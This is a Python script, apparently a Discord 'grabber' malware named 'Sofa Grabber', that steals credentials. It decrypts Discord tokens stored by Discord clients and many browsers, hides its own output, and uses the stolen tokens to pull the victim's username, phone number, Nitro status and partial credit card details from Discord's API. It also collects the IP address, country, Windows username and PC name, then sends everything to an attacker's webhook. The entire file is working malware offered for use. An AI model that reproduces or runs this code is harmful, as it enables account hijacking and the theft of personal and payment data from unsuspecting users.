import json
import urllib.request
import re
import socket
import os
import requests
from base64 import b64decode
from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData
import sys

# Redirect stdout and stderr to null to suppress print statements and errors
sys.stdout = open(os.devnull, 'w')
sys.stderr = open(os.devnull, 'w')

def decrypt(buff, master_key):
    try:
        return AES.new(CryptUnprotectData(master_key, None, None, None, 0)[1], AES.MODE_GCM, buff[3:15]).decrypt(buff[15:])[:-16].decode()
    except Exception:
        return None

def get_tokens():
    tokens = []
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')
    paths = {
        'Discord': roaming + '\\discord',
        'Discord Canary': roaming + '\\discordcanary',
        'Lightcord': roaming + '\\Lightcord',
        'Discord PTB': roaming + '\\discordptb',
        'Opera': roaming + '\\Opera Software\\Opera Stable',
        'Opera GX': roaming + '\\Opera Software\\Opera GX Stable',
        'Amigo': local + '\\Amigo\\User Data',
        'Torch': local + '\\Torch\\User Data',
        'Kometa': local + '\\Kometa\\User Data',
        'Orbitum': local + '\\Orbitum\\User Data',
        'CentBrowser': local + '\\CentBrowser\\User Data',
        '7Star': local + '\\7Star\\7Star\\User Data',
        'Sputnik': local + '\\Sputnik\\Sputnik\\User Data',
        'Vivaldi': local + '\\Vivaldi\\User Data\\Default',
        'Chrome SxS': local + '\\Google\\Chrome SxS\\User Data',
        'Chrome': local + '\\Google\\Chrome\\User Data\\Default',
        'Epic Privacy Browser': local + '\\Epic Privacy Browser\\User Data',
        'Microsoft Edge': local + '\\Microsoft\\Edge\\User Data\\Default',
        'Uran': local + '\\uCozMedia\\Uran\\User Data\\Default',
        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default',
        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Iridium': local + '\\Iridium\\User Data\\Default'
    }

    for platform, path in paths.items():
        if not os.path.exists(path):
            continue

        try:
            with open(path + "\\Local State", "r") as file:
                local_state = file.read()
                key = b64decode(json.loads(local_state)['os_crypt']['encrypted_key'])[5:]
        except:
            continue

        for file_name in os.listdir(path + "\\Local Storage\\leveldb\\"):
            if not file_name.endswith(".ldb") and not file_name.endswith(".log"):
                continue

            try:
                with open(path + f"\\Local Storage\\leveldb\\{file_name}", "r", errors='ignore') as file:
                    for line in file.readlines():
                        for token in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line):
                            decrypted_token = decrypt(b64decode(token.split('dQw4w9WgXcQ:')[1]), key)
                            if decrypted_token:
                                tokens.append(decrypted_token)
            except:
                continue

    return tokens

def get_user_data(token):
    try:
        headers = {
            "Authorization": token,
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0"
        }
        req = urllib.request.Request("https://discordapp.com/api/v6/users/@me", headers=headers)
        response = urllib.request.urlopen(req)
        return json.loads(response.read().decode())
    except:
        return None

def has_nitro(token):
    try:
        headers = {
            "Authorization": token,
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0"
        }
        response = requests.get('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=headers)
        nitro_data = response.json()
        return bool(len(nitro_data) > 0)
    except:
        return False

def get_credit_card_info(token):
    try:
        headers = {
            "Authorization": token,
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0"
        }
        response = requests.get('https://discordapp.com/api/v6/users/@me/billing/payment-sources', headers=headers)
        payment_sources = response.json()
        if len(payment_sources) > 0:
            credit_card_info = []
            for source in payment_sources:
                if source['type'] == 1:  # Credit card type
                    credit_card_info.append({
                        "brand": source['brand'],
                        "last_4": source['last_4'],
                        "expires_month": source['expires_month'],
                        "expires_year": source['expires_year']
                    })
            return credit_card_info
        return None
    except:
        return None

def get_country():
    try:
        ip_address = requests.get("https://api.ipify.org").text
        response = requests.get(f"http://ip-api.com/json/{ip_address}")
        data = response.json()
        country = data.get('country')
        return country
    except:
        return None

def get_country_flag(country_name):
    country_flags = {
        "Denmark": ":flag_dk:",
        "United States": ":flag_us:",
        "Canada": ":flag_ca:",
        "United Kingdom": ":flag_gb:",
        "Germany": ":flag_de:",
        "France": ":flag_fr:",
        "Italy": ":flag_it:",
        "Spain": ":flag_es:",
        "Australia": ":flag_au:",
        "Brazil": ":flag_br:",
        "Japan": ":flag_jp:",
        "South Korea": ":flag_kr:",
        "Russia": ":flag_ru:",
        "India": ":flag_in:",
        "Mexico": ":flag_mx:",
        "China": ":flag_cn:",
        "Netherlands": ":flag_nl:",
        "Sweden": ":flag_se:",
        "Norway": ":flag_no:",
        "Finland": ":flag_fi:",
        "New Zealand": ":flag_nz:",
        "South Africa": ":flag_za:",
        "Argentina": ":flag_ar:",
        "Belgium": ":flag_be:",
        "Austria": ":flag_at:",
        "Switzerland": ":flag_ch:",
        "Turkey": ":flag_tr:",
        "Saudi Arabia": ":flag_sa:",
        "United Arab Emirates": ":flag_ae:",
        "Israel": ":flag_il:",
        "Portugal": ":flag_pt:",
        "Poland": ":flag_pl:",
        "Ireland": ":flag_ie:",
        "Greece": ":flag_gr:",
        "Czech Republic": ":flag_cz:",
        "Hungary": ":flag_hu:",
        "Romania": ":flag_ro:",
        "Singapore": ":flag_sg:",
        "Malaysia": ":flag_my:",
        "Indonesia": ":flag_id:",
        "Thailand": ":flag_th:",
        "Philippines": ":flag_ph:",
        "Vietnam": ":flag_vn:",
        "Pakistan": ":flag_pk:",
        "Bangladesh": ":flag_bd:",
        "Sri Lanka": ":flag_lk:",
        "Egypt": ":flag_eg:",
        "Nigeria": ":flag_ng:",
        "Kenya": ":flag_ke:",
        "Ghana": ":flag_gh:",
        "Morocco": ":flag_ma:",
        "Chile": ":flag_cl:",
        "Colombia": ":flag_co:",
        "Peru": ":flag_pe:",
        "Venezuela": ":flag_ve:"
    }
    return country_flags.get(country_name, ":pirate_flag:")

# Main logic
discord_tokens = get_tokens()

if not discord_tokens:
    discord_token = "Not found"
    discord_avatar_url = "Not found"
    has_nitro_status = False
    credit_card_info = "No credit card connected"
    country_text = "Not specified"
    country_flag = ""
    username = "Not found"
    user_id = "Not found"
    phone_number = "Not found"
else:
    discord_token = discord_tokens[0]  # Use the first valid token
    user_data = get_user_data(discord_token)
    if user_data:
        discord_id = user_data['id']
        username = f"{user_data['username']}#{user_data['discriminator']}"
        user_id = user_data['id']
        avatar_hash = user_data.get('avatar')
        discord_avatar_url = f'https://cdn.discordapp.com/avatars/{discord_id}/{avatar_hash}.png'
        has_nitro_status = has_nitro(discord_token)
        credit_card_info = get_credit_card_info(discord_token)
        phone_number = user_data.get('phone', 'Not found')
        if credit_card_info:
            credit_card_info = '\n'.join(
                [f"Brand: {card['brand']}, Last 4: {card['last_4']}, Expires: {card['expires_month']}/{card['expires_year']}"
                 for card in credit_card_info]
            )
        else:
            credit_card_info = "No credit card found"
        country = get_country()
        country_text = country if country else "Not specified"
        country_flag = get_country_flag(country_text)
    else:
        discord_token = "Not found"
        discord_avatar_url = "Not found"
        has_nitro_status = False
        credit_card_info = "Not found"
        country_text = "Not specified"
        country_flag = ""
        username = "Not found"
        user_id = "Not found"
        phone_number = "Not found"

# Prepare data to send
system_info = {
    "IP Address": requests.get('https://api.ipify.org').text,
    "Name": os.getenv('USERNAME'),
    "PC Name": socket.gethostname(),
    "Platform": os.name
}

# Prepare Discord webhook data
data = {
    'content': None,
    'embeds': [
        {
            'title': 'Sofa Grabber',
            'description': (
                f":information_source: **User Information** :information_source:\n\n"
                f"> :bust_in_silhouette: **Username:** `{username}` ({user_id})\n"
                f"> :key: **Discord Token:** `{discord_token}`\n"
                f"> :credit_card: **Credit Card:**\n```\n{credit_card_info}\n```\n"
                f"> :gem: **Nitro:** {'Yes' if has_nitro_status else 'No'}\n"
                f"> {country_flag} **Country:** `{country_text}`\n"
                f"> :telephone: **Phone:** `{phone_number}`\n"
                f"\n:computer: **System Information**\n"
                f"> :desktop_computer: **IP Address:** `{system_info['IP Address']}`\n"
                f"> :house: **Name:** `{system_info['Name']}`\n"
                f"> :house_with_garden: **PC Name:** `{system_info['PC Name']}`\n"
                f"> :computer: **Platform:** `{system_info['Platform']}`\n"
            ),
            'color': 0x00ff00,  # Green color for success
            'footer': {
                'text': 'Dev: sofa penge',
                'icon_url': 'https://cdn.discordapp.com/attachments/826581697436581919/982374264604864572/atio.jpg'
            }
        }
    ]
}

# Send data to Discord webhook
webhook_url = 'Your_Webhook_here'  # replace with your webhook
try:
    response = requests.post(webhook_url, json=data)
except:
    pass

# Restore stdout and stderr
sys.stdout = sys.__stdout__
sys.stderr = sys.__stderr__
